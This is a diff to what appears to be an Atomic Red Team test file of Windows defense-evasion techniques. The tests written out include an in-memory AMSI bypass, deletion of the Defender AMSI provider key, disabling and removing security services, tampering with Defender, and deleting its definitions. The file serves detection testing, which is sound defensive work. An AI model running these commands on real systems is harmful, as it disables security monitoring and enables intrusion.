@@ -210,6 +210,8 @@ atomic_tests:
 - name: AMSI Bypass - AMSI InitFailed
   description: |
     Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+    Upon execution, no output is displayed.
+
     https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
   supported_platforms:
     - windows
@@ -219,12 +221,13 @@ atomic_tests:
     command: |
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     cleanup_command: |
-      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false) -ErrorAction Ignore
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
 
 - name: AMSI Bypass - Remove AMSI Provider Reg Key
   description: |
     With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
-    This test removes the Windows Defender provider registry key.
+    This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
+    Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone.
   supported_platforms:
     - windows
   executor:
@@ -232,12 +235,14 @@ atomic_tests:
     elevation_required: true
     command: |
        Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
-    cleanup_command: | 
+    cleanup_command: |
        New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
 
 - name: Disable Arbitrary Security Windows Service
   description: |
-    With administrative rights, an adversary can disable Windows Services related to security products.
+    With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.
+    Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
+    To verify that the service has stopped, run "sc query McAfeeDLPAgentService"
   supported_platforms:
     - windows
   input_arguments:
@@ -254,40 +259,6 @@ atomic_tests:
     cleanup_command: |
        sc.exe config #{service_name} start= auto >nul 2>&1
        net.exe start #{service_name} >nul 2>&1
-
-- name: Disable PowerShell Script Block Logging
-  description: |
-    An adversary may disable PowerShell Script Block Logging to avoid leaving evidence.
-
-    Credit to Matt Graeber (@mattifestation) for the research.
-  supported_platforms:
-    - windows
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-      $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
-      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
-      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
-    cleanup_command: |
-      $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
-      $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
-      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 1
-      $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 1
-
-- name: PowerShell Bypass of AntiMalware Scripting Interface
-  description: |
-    An adversary may bypass Windows Defender AMSI to execute malicious PowerShell code.
-
-    Credit to Matt Graeber (@mattifestation) for the research.
-  supported_platforms:
-    - windows
-  executor:
-    name: powershell
-    elevation_required: false
-    command: |
-      [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 - name: Tamper with Windows Defender ATP PowerShell
   description: |
@@ -312,7 +283,8 @@ atomic_tests:
 - name: Tamper with Windows Defender Command Prompt
   description: |
     Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
-    However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on.
+    However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, "Access Denied"
+    will be displayed twice and the WinDefend service status will be displayed.
   supported_platforms:
     - windows
   executor:
@@ -343,7 +315,7 @@ atomic_tests:
 - name: Disable Microft Office Security Features
   description: |
     Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
-    show any warning before editing the document
+    show any warning before editing the document.
 
 
     https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
@@ -378,3 +350,20 @@ atomic_tests:
     elevation_required: true
     command: |
       "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+- name: Stop and Remove Arbitrary Security Windows Service
+  description: |
+    Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.
+  supported_platforms:
+    - windows
+  input_arguments:
+     service_name:
+       description: The name of the service to remove
+       type: String
+       default: McAfeeDLPAgentService
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      Stop-Service -Name #{service_name}
+      Remove-Service -Name #{service_name}
